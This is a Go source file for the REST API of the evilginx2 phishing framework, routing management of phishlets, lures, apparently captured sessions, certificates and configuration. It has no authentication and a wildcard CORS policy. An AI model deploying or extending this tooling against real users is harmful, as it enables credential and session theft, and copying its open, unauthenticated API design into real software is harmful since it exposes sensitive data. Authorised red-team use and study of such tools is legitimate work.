package api

import (
	"context"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/internal/phishlet"
	"github.com/kgretzky/evilginx2/internal/storage"
)

type Server struct {
	router       *gin.Engine
	storage      storage.Interface
	phishletRepo *phishlet.PhishletRepository
	handlers     *Handlers
}

type Handlers struct {
	storage      storage.Interface
	phishletRepo *phishlet.PhishletRepository
}

func NewServer(storage storage.Interface, phishletRepo *phishlet.PhishletRepository) *Server {
	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.Use(gin.Logger())
	router.Use(gin.Recovery())
	router.Use(corsMiddleware())

	handlers := &Handlers{
		storage:      storage,
		phishletRepo: phishletRepo,
	}

	server := &Server{
		router:       router,
		storage:      storage,
		phishletRepo: phishletRepo,
		handlers:     handlers,
	}

	server.setupRoutes()
	return server
}

func (s *Server) setupRoutes() {
	api := s.router.Group("/api/v1")
	
	phishlets := api.Group("/phishlets")
	{
		phishlets.GET("", s.handlers.listPhishlets)
		phishlets.POST("", s.handlers.createPhishlet)
		phishlets.GET("/:name", s.handlers.getPhishlet)
		phishlets.PUT("/:name", s.handlers.updatePhishlet)
		phishlets.DELETE("/:name", s.handlers.deletePhishlet)
		
		phishlets.GET("/:name/versions", s.handlers.listPhishletVersions)
		phishlets.POST("/:name/versions", s.handlers.createPhishletVersion)
		phishlets.GET("/:name/versions/:version", s.handlers.getPhishletVersion)
		phishlets.POST("/:name/conditions/evaluate", s.handlers.evaluateConditions)
		phishlets.GET("/:name/flows", s.handlers.getMultiPageFlows)
		phishlets.POST("/:name/flows/:flow/step", s.handlers.updateFlowStep)
	}

	sessions := api.Group("/sessions")
	{
		sessions.GET("", s.handlers.listSessions)
		sessions.POST("", s.handlers.createSession)
		sessions.GET("/:id", s.handlers.getSession)
		sessions.PUT("/:id", s.handlers.updateSession)
		sessions.DELETE("/:id", s.handlers.deleteSession)
	}

	lures := api.Group("/lures")
	{
		lures.GET("", s.handlers.listLures)
		lures.POST("", s.handlers.createLure)
		lures.GET("/:id", s.handlers.getLure)
		lures.PUT("/:id", s.handlers.updateLure)
		lures.DELETE("/:id", s.handlers.deleteLure)
	}

	config := api.Group("/config")
	{
		config.GET("", s.handlers.getConfig)
		config.POST("", s.handlers.setConfig)
		config.DELETE("/:key", s.handlers.deleteConfig)
	}

	certificates := api.Group("/certificates")
	{
		certificates.GET("", s.handlers.listCertificates)
		certificates.POST("", s.handlers.createCertificate)
		certificates.GET("/:domain", s.handlers.getCertificate)
		certificates.DELETE("/:domain", s.handlers.deleteCertificate)
	}

	s.router.GET("/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})
}

func (s *Server) Start(addr string) error {
	return s.router.Run(addr)
}

func (s *Server) StartWithContext(ctx context.Context, addr string) error {
	srv := &http.Server{
		Addr:    addr,
		Handler: s.router,
	}

	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		srv.Shutdown(shutdownCtx)
	}()

	return srv.ListenAndServe()
}

func corsMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}

		c.Next()
	}
}
